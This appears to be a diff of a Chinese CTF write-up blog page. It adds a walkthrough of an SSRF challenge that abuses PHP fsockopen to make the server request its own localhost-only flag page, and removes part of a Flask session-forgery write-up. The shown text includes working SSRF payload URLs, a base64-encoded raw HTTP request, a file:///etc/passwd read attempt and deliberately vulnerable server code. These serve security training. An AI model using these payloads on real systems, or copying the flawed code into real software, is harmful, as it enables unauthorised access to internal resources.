@@ -3514,6 +3514,204 @@
     <div class="md-post__meta md-meta">
       <ul class="md-meta__list">
         <li class="md-meta__item">
+          <time datetime="2026-11-11 19:40:00+00:00">2026-11-11</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="../../category/php/" class="md-meta__link">PHP</a>, 
+              <a href="../../category/ssrf/" class="md-meta__link">SSRF</a>, 
+              <a href="../../category/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="md-meta__link">代码审计</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 2 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="hnctf-2022-week2-ez_ssrf-fsockopen-http"><a class="toclink" href="../../hnctf2022-week2-ez-ssrf/">[HNCTF 2022 WEEK2] ez_ssrf — fsockopen 自己给自己发一条 HTTP</a></h2>
+<blockquote>
+<p><strong>题目类型</strong>：PHP 代码审计 — fsockopen 造成的 SSRF（本机回环绕过来源校验）</p>
+<p><strong>Flag</strong>：<code>nssctf{095948b9b2be-8444-3750-99ba94d3b4f5}</code></p>
+</blockquote>
+<hr />
+<h3 id="_1"><a class="toclink" href="../../hnctf2022-week2-ez-ssrf/#_1">题目概述</a></h3>
+<p>提示让进 <code>index.php</code>，进去就是源码。<strong><code>highlight_file(__FILE__)</code>，一点遮挡都没有。</strong></p>
+<p>同时扫目录扫到 <code>flag.php</code>，<strong>但直接访问它，返回的是 <code>localhost plz</code>。</strong></p>
+<hr />
+<h3 id="_2"><a class="toclink" href="../../hnctf2022-week2-ez-ssrf/#_2">解题过程</a></h3>
+<h4 id="step-1"><a class="toclink" href="../../hnctf2022-week2-ez-ssrf/#step-1">Step 1：先看源码</a></h4>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="cp">&lt;?php</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="nv">$data</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'data'</span><span class="p">]);</span>
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="nv">$host</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'host'</span><span class="p">];</span>
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="nv">$port</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'port'</span><span class="p">];</span>
+</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>
+</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a><span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fsockopen</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="nb">intval</span><span class="p">(</span><span class="nv">$port</span><span class="p">),</span> <span class="nv">$error</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="mi">30</span><span class="p">);</span>
+</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a>    <span class="k">die</span><span class="p">();</span>
+</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span id="__span-12-13"><a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a>    <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+</span><span id="__span-12-14"><a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a>    <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
+</span><span id="__span-12-15"><a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a>        <span class="k">echo</span> <span class="nb">fgets</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="mi">128</span><span class="p">);</span>
+</span><span id="__span-12-16"><a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a>    <span class="p">}</span>
+</span><span id="__span-12-17"><a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a>    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
+</span><span id="__span-12-18"><a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a><span class="p">}</span>
+</span></code></pre></div>
+<p><strong>三个参数全部来自 GET，而且都直接进函数：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>host  →  fsockopen 的第一个参数
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>port  →  第二个参数（有 intval）
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>data  →  base64 解码后直接写进 socket
+</span></code></pre></div>
+<p><strong><code>fsockopen</code> 是“建立一条 TCP 连接”，<code>fwrite</code> 是“往这条连接里发原始字节”。</strong></p>
+<p><strong>这等于给了我们一个可以</strong>手写任意 TCP 报文<strong>的口子。</strong></p>
+<h4 id="step-2-host"><a class="toclink" href="../../hnctf2022-week2-ez-ssrf/#step-2-host">Step 2：为什么改 Host 头没用</a></h4>
+<p><strong><code>flag.php</code> 检查的不是请求头里的 <code>Host</code>，而是</strong>连接的来源地址<strong>（<code>$_SERVER['REMOTE_ADDR']</code>）。</strong></p>
+<p><strong>所以你在浏览器或 Burp 里把 <code>Host: localhost</code> 改掉，来源地址还是你自己的 IP，一样被拒。</strong></p>
+<p><strong>这就是这题的题眼：改“名字”没用，得改“谁在连”。</strong></p>
+<p><strong>要让来源变成 <code>127.0.0.1</code>，只有一条路——</strong>让服务器自己去连自己<strong>。</strong></p>
+<h4 id="step-3"><a class="toclink" href="../../hnctf2022-week2-ez-ssrf/#step-3">Step 3：构造发出去的报文</a></h4>
+<p><strong><code>fsockopen('127.0.0.1', 80)</code> 连上的是这台机器自己的 80 端口，也就是 Web 服务器本身。来源地址自然就是 127.0.0.1。</strong></p>
+<p><strong>接下来 <code>fwrite($fp, $data)</code> 会把 <code>data</code> 原样写进这个 socket。</strong>既然对面是 HTTP 服务器，那我们就手写一条 HTTP 请求：**</p>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="nf">GET</span> <span class="nn">/flag.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">localhost</span>
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+</span></code></pre></div>
+<p><strong>注意三件事：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>① 每一行结尾必须是 \r\n（CRLF），不是 \n
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>② 最后要有一个空行（\r\n\r\n），表示请求头结束
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>③ Connection: close 让对端在响应完就关闭连接，
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>   这样后面 fgets 才能读到 EOF，不会一直挂着
+</span></code></pre></div>
+<p><strong>编码成 base64：</strong></p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="n">raw</span> <span class="o">=</span> <span class="s2">"GET /flag.php HTTP/1.1</span><span class="se">\r\n</span><span class="s2">Host: localhost</span><span class="se">\r\n</span><span class="s2">Connection: close</span><span class="se">\r\n\r\n</span><span class="s2">"</span>
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">raw</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></code></pre></div>
+<p><strong>得到：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogbG9jYWxob3N0DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=
+</span></code></pre></div>
+<h4 id="step-4-base64"><a class="toclink" href="../../hnctf2022-week2-ez-ssrf/#step-4-base64">Step 4：为什么建议用脚本生成 base64</a></h4>
+<p><strong><code>\r\n</code> 这两个字符最容易在“复制粘贴”里丢掉。</strong></p>
+<p><strong>很多在线 base64 工具、聊天框、编辑器，会把 <code>\r\n</code> 悄悄规范成 <code>\n</code>，你看起来“一模一样”，但发出去的报文行尾是 LF，</strong>服务端解析请求行的时候就错了<strong>。</strong></p>
+<p><strong>所以这题的编码一定在脚本里做：</strong>让 <code>\r\n</code> 从代码里生成，不让它经过剪贴板。</p>
+<h4 id="step-5-payload"><a class="toclink" href="../../hnctf2022-week2-ez-ssrf/#step-5-payload">Step 5：打完整 payload</a></h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>index.php?host=127.0.0.1&amp;port=80&amp;data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogbG9jYWxob3N0DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=
+</span></code></pre></div>
+<p><strong>服务器做的事：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>fsockopen("127.0.0.1", 80)      建立本机连接，来源 = 127.0.0.1
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>fwrite 我们的 HTTP 报文         请求 /flag.php
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>while 循环 fgets 读回响应       flag 就在响应体里
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>echo                           输出到页面
+</span></code></pre></div>
+<p><strong>拿到：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>nssctf{095948b9b2be-8444-3750-99ba94d3b4f5}
+</span></code></pre></div>
+<hr />
+<h3 id="_3"><a class="toclink" href="../../hnctf2022-week2-ez-ssrf/#_3">顺带解释：为什么这题“回应有点慢”</a></h3>
+<p><strong>源码里这句是写错了的：</strong></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="x">while (!feof($data)) {      // $data 是字符串，不是文件句柄</span>
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="x">    echo fgets($fp, 128);</span>
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="x">}</span>
+</span></code></pre></div>
+<p><strong><code>feof()</code> 的参数应该是文件句柄（这里该是 <code>$fp</code>）。传字符串进去，它只会返回 <code>false</code>（配合 <code>error_reporting(0)</code>，连警告都看不到）。</strong></p>
+<p><strong>于是 <code>!feof($data)</code> 恒为真——这个循环实际上是个</strong>死循环<strong>。</strong></p>
+<p><strong>它能“结束”，靠的是：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>对端响应完 → Connection: close 关闭连接
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>→ fgets($fp) 读到 EOF 返回 false
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>→ echo false 什么也不输出，但循环还在转
+</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>→ 直到 PHP 脚本超时（或连接彻底断掉）才停
+</span></code></pre></div>
+<p><strong>flag 在第一轮就已经被 <code>echo</code> 出去了，所以你能看到结果；</strong>但请求会一直挂到超时，这就是“慢”的来源。**</p>
+<p><strong>如果按正确写法 <code>feof($fp)</code>，读到 EOF 就该退出循环，响应会立刻返回。</strong></p>
+<hr />
+<table>
+<thead>
+<tr>
+<th>关键点</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>fsockopen</code></td>
+<td>建立 TCP 连接，host/port 全可控 → SSRF</td>
+</tr>
+<tr>
+<td>来源校验</td>
+<td><code>flag.php</code> 判的是 <code>REMOTE_ADDR</code>，不是 <code>Host</code> 头</td>
+</tr>
+<tr>
+<td>绕过思路</td>
+<td>让服务器连自己（127.0.0.1），来源就变成内网</td>
+</tr>
+<tr>
+<td><code>data</code></td>
+<td>base64 解码后原样 <code>fwrite</code>，等于手写 TCP 报文</td>
+</tr>
+<tr>
+<td>报文格式</td>
+<td>行尾 <code>\r\n</code>，头部结束后要空行 <code>\r\n\r\n</code></td>
+</tr>
+<tr>
+<td><code>Connection: close</code></td>
+<td>让对端响应后关连接，<code>fgets</code> 才能读到 EOF</td>
+</tr>
+<tr>
+<td><code>feof($data)</code></td>
+<td>源码笔误（应为 <code>$fp</code>），导致死循环 → 响应慢</td>
+</tr>
+<tr>
+<td>base64 陷阱</td>
+<td>剪贴板/工具会把 <code>\r\n</code> 变 <code>\n</code>，必须在脚本里生成</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<details class="note">
+<summary>完整请求</summary>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>GET /index.php?host=127.0.0.1&amp;port=80&amp;data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogbG9jYWxob3N0DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>data 解码后：
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>GET /flag.php HTTP/1.1\r\n
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>Host: localhost\r\n
+</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>Connection: close\r\n
+</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a>\r\n
+</span></code></pre></div>
+</details>
+<details class="note">
+<summary>这题踩的坑</summary>
+<p><strong>① 改 <code>Host</code> 头</strong></p>
+<p><code>Host: localhost</code> 改与不改都没用——服务端看的不是这个头，是 TCP 连接的来源地址。</p>
+<p><strong>② payload 里手写 <code>127.0.01</code></strong></p>
+<p>少一位点。<code>127.0.01</code> 在很多系统里解析不到，或者被当成别的写法，连接直接失败。</p>
+<p><strong>③ 在线工具转 base64</strong></p>
+<p><code>\r\n</code> 被吃成 <code>\n</code>，报文行尾就错了。<strong>这题的编码必须在脚本里做。</strong></p>
+<p><strong>④ 以为响应慢是网络问题</strong></p>
+<p>是源码里 <code>feof($data)</code> 写错导致的死循环，跟网络无关。</p>
+</details>
+    
+    
+  </div>
+</article>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
           <time datetime="2026-11-10 22:10:00+00:00">2026-11-10</time></li>
         
           <li class="md-meta__item">
@@ -5675,305 +5873,6 @@
 <p><strong>② 中文引号</strong></p>
 <p>手打 payload 时输入法给了 <code>‘’</code>（U+2018/U+2019），Jinja/Smarty 都不认，报 <code>unexpected char</code>。</p>
 <p><strong>打模板时把输入法切英文；报错里连位置都给了（<code>at 2</code>），照着看就行。</strong></p>
-</details>
-    
-    
-  </div>
-</article>
-      
-        <article class="md-post md-post--excerpt">
-  <header class="md-post__header">
-    
-    <div class="md-post__meta md-meta">
-      <ul class="md-meta__list">
-        <li class="md-meta__item">
-          <time datetime="2026-11-01 15:20:00+00:00">2026-11-01</time></li>
-        
-          <li class="md-meta__item">
-            分类于
-            
-              <a href="../../category/python/" class="md-meta__link">Python</a>, 
-              <a href="../../category/flask/" class="md-meta__link">Flask</a>, 
-              <a href="../../category/%E5%BC%B1%E9%9A%8F%E6%9C%BA/" class="md-meta__link">弱随机</a></li>
-        
-        
-          
-          <li class="md-meta__item">
-            
-              需要 5 分钟阅读时间
-            
-          </li>
-        
-        
-      </ul>
-      
-    </div>
-  </header>
-  <div class="md-post__content md-typeset">
-    <h2 id="ciscn2019-web4-mac-secret_key"><a class="toclink" href="../../ciscn2019-web4-flask-seed/">[CISCN2019 华东南赛区] Web4 — 从 MAC 地址推回 SECRET_KEY</a></h2>
-<blockquote>
-<p><strong>题目类型</strong>：Web — Flask 源码泄露 + 伪随机数预测 + session 伪造</p>
-<p><strong>题目地址</strong>：BUUCTF / ctf2 复刻环境</p>
-<p><strong>Flag</strong>：<code>CTF2{b5ab3e88-9e2a-4217-ba5f-b92ba1c7c4ff}</code></p>
-</blockquote>
-<hr />
-<h3 id="_1"><a class="toclink" href="../../ciscn2019-web4-flask-seed/#_1">题目概述</a></h3>
-<p>进入页面只有一份跳转页，点击后自动跳到百度。</p>
-<p><strong><code>/read?url=</code> 能读 URL 指向的东西，但 <code>file://</code> 被过滤了，返回 <code>No Hack</code>。</strong></p>
-<p><strong>这题真正要做的不是"绕过过滤器读文件"，而是：读出源码 → 从源码里发现 <code>SECRET_KEY</code> 是</strong>用 MAC 地址当种子生成的伪随机数** → 读出 MAC → 本地算出密钥 → 伪造 session → 访问 <code>/flag</code>。**</p>
-<hr />
-<h3 id="_2"><a class="toclink" href="../../ciscn2019-web4-flask-seed/#_2">解题过程</a></h3>
-<h4 id="step-1"><a class="toclink" href="../../ciscn2019-web4-flask-seed/#step-1">Step 1：先试能不能读文件</a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>/read?url=file:///etc/passwd   →  No Hack
-</span></code></pre></div>
-<p><strong>说明它拦了 <code>file</code>。</strong>先别急着绕，把这题的源码拿到手更值。</p>
-<h4 id="step-2-jwt"><a class="toclink" href="../../ciscn2019-web4-flask-seed/#step-2-jwt">Step 2：我一开始以为是 JWT（错了）</a></h4>
-<p><strong>看到 session cookie 是三段、点分隔，我第一反应是「这是 JWT」。</strong></p>
-<p><strong>这个判断是错的，而且会把人带偏——因为伪造 JWT 和伪造 Flask session 用的工具完全不同。</strong></p>
-<p><strong>正确的判断方法：把第一段 base64 解开看是什么。</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>Flask session 的第一段   →  直接是 {"username": ...} 这样的 JSON 数据
-</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>JWT 的第一段             →  是 {"alg":"HS256","typ":"JWT"} 这样的 header
-</span></code></pre></div>
-<p><strong>Flask session 用的是 <code>itsdangerous</code>：<code>base64(数据).时间戳.HMAC-SHA1签名</code>，密钥就是 <code>SECRET_KEY</code>。长得像 JWT，但完全是两套东西。</strong></p>
-<h4 id="step-3"><a class="toclink" href="../../ciscn2019-web4-flask-seed/#step-3">Step 3：拿到源码</a></h4>
-<p><img alt="源码" src="../../../assets/images/ciscn2019-web4/01-source.png" /></p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">re</span><span class="o">,</span><span class="w"> </span><span class="nn">random</span><span class="o">,</span><span class="w"> </span><span class="nn">uuid</span><span class="o">,</span><span class="w"> </span><span class="nn">urllib</span>
-</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">request</span>
-</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>
-</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
-</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a><span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">getnode</span><span class="p">())</span>                          <span class="c1"># ← 关键</span>
-</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">'SECRET_KEY'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">random</span><span class="p">()</span><span class="o">*</span><span class="mi">233</span><span class="p">)</span>  <span class="c1"># ← 关键</span>
-</span><span id="__span-20-7"><a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a><span class="n">app</span><span class="o">.</span><span class="n">debug</span> <span class="o">=</span> <span class="kc">True</span>
-</span><span id="__span-20-8"><a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a>
-</span><span id="__span-20-9"><a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/'</span><span class="p">)</span>
-</span><span id="__span-20-10"><a id="__codelineno-20-10" name="__codelineno-20-10" href="#__codelineno-20-10"></a><span class="k">def</span><span class="w"> </span><span class="nf">index</span><span class="p">():</span>
-</span><span id="__span-20-11"><a id="__codelineno-20-11" name="__codelineno-20-11" href="#__codelineno-20-11"></a>    <span class="n">session</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'www-data'</span>
-</span><span id="__span-20-12"><a id="__codelineno-20-12" name="__codelineno-20-12" href="#__codelineno-20-12"></a>    <span class="k">return</span> <span class="s1">'Hello World! Read somethings'</span>
-</span><span id="__span-20-13"><a id="__codelineno-20-13" name="__codelineno-20-13" href="#__codelineno-20-13"></a>
-</span><span id="__span-20-14"><a id="__codelineno-20-14" name="__codelineno-20-14" href="#__codelineno-20-14"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/read'</span><span class="p">)</span>
-</span><span id="__span-20-15"><a id="__codelineno-20-15" name="__codelineno-20-15" href="#__codelineno-20-15"></a><span class="k">def</span><span class="w"> </span><span class="nf">read</span><span class="p">():</span>
-</span><span id="__span-20-16"><a id="__codelineno-20-16" name="__codelineno-20-16" href="#__codelineno-20-16"></a>    <span class="k">try</span><span class="p">:</span>
-</span><span id="__span-20-17"><a id="__codelineno-20-17" name="__codelineno-20-17" href="#__codelineno-20-17"></a>        <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'url'</span><span class="p">)</span>
-</span><span id="__span-20-18"><a id="__codelineno-20-18" name="__codelineno-20-18" href="#__codelineno-20-18"></a>        <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s1">'^file.*'</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">IGNORECASE</span><span class="p">)</span>
-</span><span id="__span-20-19"><a id="__codelineno-20-19" name="__codelineno-20-19" href="#__codelineno-20-19"></a>        <span class="n">n</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s1">'flag'</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">IGNORECASE</span><span class="p">)</span>
-</span><span id="__span-20-20"><a id="__codelineno-20-20" name="__codelineno-20-20" href="#__codelineno-20-20"></a>        <span class="k">if</span> <span class="n">m</span> <span class="ow">or</span> <span class="n">n</span><span class="p">:</span>
-</span><span id="__span-20-21"><a id="__codelineno-20-21" name="__codelineno-20-21" href="#__codelineno-20-21"></a>            <span class="k">return</span> <span class="s1">'No Hack'</span>
-</span><span id="__span-20-22"><a id="__codelineno-20-22" name="__codelineno-20-22" href="#__codelineno-20-22"></a>        <span class="n">res</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
-</span><span id="__span-20-23"><a id="__codelineno-20-23" name="__codelineno-20-23" href="#__codelineno-20-23"></a>        <span class="k">return</span> <span class="n">res</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-</span><span id="__span-20-24"><a id="__codelineno-20-24" name="__codelineno-20-24" href="#__codelineno-20-24"></a>    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">ex</span><span class="p">:</span>
-</span><span id="__span-20-25"><a id="__codelineno-20-25" name="__codelineno-20-25" href="#__codelineno-20-25"></a>        <span class="nb">print</span> <span class="nb">str</span><span class="p">(</span><span class="n">ex</span><span class="p">)</span>
-</span><span id="__span-20-26"><a id="__codelineno-20-26" name="__codelineno-20-26" href="#__codelineno-20-26"></a>        <span class="k">return</span> <span class="s1">'no response'</span>
-</span><span id="__span-20-27"><a id="__codelineno-20-27" name="__codelineno-20-27" href="#__codelineno-20-27"></a>
-</span><span id="__span-20-28"><a id="__codelineno-20-28" name="__codelineno-20-28" href="#__codelineno-20-28"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/flag'</span><span class="p">)</span>
-</span><span id="__span-20-29"><a id="__codelineno-20-29" name="__codelineno-20-29" href="#__codelineno-20-29"></a><span class="k">def</span><span class="w"> </span><span class="nf">flag</span><span class="p">():</span>
-</span><span id="__span-20-30"><a id="__codelineno-20-30" name="__codelineno-20-30" href="#__codelineno-20-30"></a>    <span class="k">if</span> <span class="n">session</span> <span class="ow">and</span> <span class="n">session</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'fuck'</span><span class="p">:</span>
-</span><span id="__span-20-31"><a id="__codelineno-20-31" name="__codelineno-20-31" href="#__codelineno-20-31"></a>        <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'/flag.txt'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-</span><span id="__span-20-32"><a id="__codelineno-20-32" name="__codelineno-20-32" href="#__codelineno-20-32"></a>    <span class="k">else</span><span class="p">:</span>
-</span><span id="__span-20-33"><a id="__codelineno-20-33" name="__codelineno-20-33" href="#__codelineno-20-33"></a>        <span class="k">return</span> <span class="s1">'Access denied'</span>
